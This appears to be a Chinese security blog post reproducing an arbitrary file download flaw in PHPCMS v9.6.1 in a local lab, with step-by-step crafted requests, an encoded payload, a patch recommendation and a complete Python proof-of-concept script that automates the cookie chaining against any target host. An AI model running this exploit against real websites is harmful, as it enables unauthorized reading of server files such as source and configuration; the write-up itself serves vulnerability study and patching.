---
title: PHPCMSv9.6.1任意文件下载漏洞复现
date: 2019-02-25 20:32:30
tags:
	- PHPCMSv9  
	- 任意文件下载 
	- PHP
categories: 漏洞复现
---

## 0x00 环境介绍

- 系统：Windows 10
- Phpstudy 2018
- CMS：PHPCMS v9.6.1
  - PHPCMS v9各版本下载地址：`http://download.phpcms.cn/v9/9.6/`

<!-- more -->

## 0x01 安装PHPCMS v9

首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。

启动phpstudy，访问`http://localhost/install_package/install/install.php`进入安装界面。

依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。

## 0x02 漏洞利用

**1.获取Cookie：xxx_siteid**

首先访问`http://localhost/install_package/index.php?m=wap&c=index&a=init&siteid=1`并获取Cookie。

![](phpcms9-6-1\siteid.png)

**2.获取Cookie：xxx_att_json**

访问`http://localhost/install_package/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。

![](phpcms9-6-1\att_json.png)

要点：

> - `src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是`/phpcms/modules/content/down.php`。

**3.获取下载链接**

访问`http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=`，并将上一步得到的xxx_att_json的值作为a_k参数的值。

> `http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g`

访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。

![](phpcms9-6-1\download.png)

## 0x03 遇到的问题

得到下载连接访问页面，点击下载会报参数错误。

解决办法：

> - `https://blog.csdn.net/vindraz/article/details/12579211`
> - `http://www.cmsyou.com/support/172.html`

## 0x04 修复建议

升级PHPCMS版本到9.6.2或以上。

## 0x05 PoC

- Github：`https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py`
- 代码：

```python
import requests
import re
import sys

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64)"}

def get_cookie1(host):
    url_1 = host + "/index.php?m=wap&c=index&a=init&siteid=1"
    print("[*] 请稍等...正在获取Cookie:")
    reponse = requests.get(url_1,headers=headers)

    
    try:
        pattern = r".*siteid"  #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配
        for item in reponse.cookies.keys():
            res = re.findall(pattern,item)

            if res:
                cookie1 = reponse.cookies.get(res[0])
                print("[+] 获取到Cookie1:")
                print("[+] " + res[0] + ":" + cookie1)
                return cookie1

    except:
        print("[-] 获取Cookie1失败!")

def get_cookie2(host,cookie1):
    #该payload实现下载phpcms/modules/content/down.php文件 
    payload = "src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C"
    
    #payload = "src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D"
    #payload = "src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D"

    url_2 = host + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&" + payload
        
    data = {"userid_flash":cookie1}  #将第一次得到的cookie作为"userid_flash"的值，并以POST方式提交
    reponse = requests.post(url_2,data=data,headers=headers)

    try:
        pattern = r".*att_json" #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配
        for item in reponse.cookies.keys():
            res = re.findall(pattern,item)
            if res:
                cookie2 = reponse.cookies.get(res[0])
                print("[+] 获取到Cookie2:")
                print("[+] " + res[0] + ":" + cookie2)
                return cookie2

    except:
        print("[-] 获取Cookie2失败!")

def help():
    print("-------------------------------------------------------------------------")
    print(" [*] 使用说明：给出index.php之前的部分")
    print("       Usage: python3 phpcmsv9.py http://host:port")
    print("     Example：python3 phpcmsv9.py http://localhost/phpcms")
    print("-------------------------------------------------------------------------")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        help()
        sys.exit(0)

    host = sys.argv[1].strip()
    cookie1 = get_cookie1(host)
    cookie2 = get_cookie2(host,cookie1)

    if cookie2:
        print("[+] Open link to download file: ")
        print("[+] " + host + "/index.php?m=content&c=down&a=init&a_k=" + cookie2) #最终文件下载连接
```

